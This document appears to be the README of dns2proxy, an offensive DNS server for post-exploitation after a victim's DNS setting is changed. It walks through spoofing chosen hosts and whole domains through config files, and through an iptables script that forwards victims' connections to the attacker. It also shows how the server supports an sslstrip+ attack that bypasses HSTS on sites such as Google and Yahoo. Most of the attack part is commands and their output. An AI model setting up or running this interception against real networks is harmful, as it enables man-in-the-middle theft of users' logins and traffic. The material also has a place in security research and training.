# dns2proxy  
 
Offensive DNS server  
  
This tools offer a different features for post-explotation once you change the DNS server to a Victim.
<Referer to help (-h) to new params options>

 
## Installation  
  
dnspython (www.dnspython.com) is needed. 
Tested with Python 2.6 and Python 2.7.

    $ sudo chmod +x install.sh
    $ sudo ./install.sh
    (venv)$ python dns2proxy.py


## Config files description

domains.cfg (or dominios.cfg): resolve all hosts for the listed domains with the listed IP 
    Ex: 
    .facebook.com 1.2.3.4 
    .fbi.gov 1.2.3.4 

spoof.cfg : Spoof a host with a ip 
    Ex: 
    www.nsa.gov 127.0.0.1 

nospoof.cfg: Send always a legit response when asking for these hosts. 
    Ex. 
    mail.google.com 

nospoofto.cfg: Don't send fake responses to the IPs listed there. 
    Ex: 
    127.0.0.1 
    4.5.6.8 

victims.cfg: If not empty, only send fake responses to these IP addresses.
    Ex: 
    23.66.163.36 
    195.12.226.131   

resolv.conf: DNS server to forward the queries.
    Ex:
    nameserver 8.8.8.8


### Feature 1 
  
Traditional DNS Spoof adding to the response the original IP address.  
  
Using spoof.cfg file:  
  
   hostname ip.ip.ip.ip  
  
    root@kali:~/dns2proxy# echo "www.s21sec.com 1.1.1.1" > spoof.cfg  
      
// launch in another terminal dns2proxy.py  
      
    root@kali:~/dns2proxy# nslookup www.s21sec.com 127.0.0.1  
    Server:         127.0.0.1  
    Address:        127.0.0.1#53  
      
    Name:   www.s21sec.com  
    Address: 1.1.1.1  
    Name:   www.s21sec.com  
    Address: 88.84.64.30  
  
  
or you can use domains.cfg file to spoof all host of a same domain:  
  
    root@kali:~/demoBH/dns2proxy# cat dominios.cfg  
    .domain.com 192.168.1.1  
      
    root@kali:~/demoBH/dns2proxy# nslookup aaaa.domain.com 127.0.0.1  
    Server:         127.0.0.1  
    Address:        127.0.0.1#53  
      
    Name:   aaaa.domain.com  
    Address: 192.168.1.1  
 
Hostnames at nospoof.cfg will no be spoofed.  
  
### Feature 2  
  
This feature implements the attack of DNS spoofing adding 2 IP address at the top of the resolution and configuring the system to forward the connections.  
Check my slides at BlackHat Asia 2014 [OFFENSIVE: EXPLOITING DNS SERVERS CHANGES] (http://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) and the [Demo Video] (http://www.youtube.com/watch?v=cJtbxX1HS5I).    
  
To launch this attach there is a shellscript that automatically configure the system using IP tables. You must edit this file to adapt it to your system. DONÂ´T FORGET AdminIP variable!!!!  
Both IPs must be at the same system to let dns2proxy.py configurate the forwarding  
  
Usage: ia.sh < interface > [ip1] [ip2]   
  
  
    root@kali:~/dns2proxy# ./ia.sh eth0 172.16.48.128 172.16.48.230  
    Non spoofing imap.gmail.com  
    Non spoofing mail.s21sec.com  
    Non spoofing www.google.com  
    Non spoofing www.apple.com  
    Non spoofing ccgenerals.ms19.gamespy.com  
    Non spoofing master.gamespy.com  
    Non spoofing gpcm.gamespy.com  
    Non spoofing launch.gamespyarcade.com  
    Non spoofing peerchat.gamespy.com  
    Non spoofing gamestats.gamespy.com  
    Specific host spoofing www.s21sec.com with 1.1.1.1  
    Specific domain IP .domain.com with 192.168.1.1  
    binded to UDP port 53.  
    waiting requests.  
    Starting sniffing in (eth0 = 172.16.48.128)....  
  
< at other terminal >  
 
    root@kali:~/dns2proxy# nslookup www.microsoft.com 127.0.0.1  
    Server:         127.0.0.1  
    Address:        127.0.0.1#53  
      
    Name:   www.microsoft.com  
    Address: 172.16.48.128  
    Name:   www.microsoft.com  
    Address: 172.16.48.230  
    Name:   www.microsoft.com  
    Address: 65.55.57.27  
  
  
The fhtang.sh script will terminate the program and restore normal iptables.  
  
Hostnames at nospoof.cfg will no be spoofed.  
  
  
### Feature 3
  
Automatically the dns server detects and correct the changes thats my sslstrip+ do to the hostnames to avoid HSTS, so will response properly.  
  
This server is necesary to make the sslstrip+ attack.  
  
    root@kali:~/dns2proxy# nslookup webaccounts.google.com 127.0.0.1    <-- DNS response like accounts.google.com  
    Server:         127.0.0.1  
    Address:        127.0.0.1#53  
      
    Name:   webaccounts.google.com  
    Address: 172.16.48.128  
    Name:   webaccounts.google.com  
    Address: 172.16.48.230  
    Name:   webaccounts.google.com  
    Address: 74.125.200.84  

Another example

    root@kali:~/dns2proxy# nslookup wwww.yahoo.com 127.0.0.1            <-- Take care of the 4 w! DNS response like  
    Server:         127.0.0.1                                                     www.yahoo.com  
    Address:        127.0.0.1#53  
      
    Name:   wwww.yahoo.com  
    Address: 172.16.48.128  
    Name:   wwww.yahoo.com  
    Address: 172.16.48.230  
    Name:   wwww.yahoo.com  
    Address: 68.142.243.179  
    Name:   wwww.yahoo.com  
    Address: 68.180.206.184
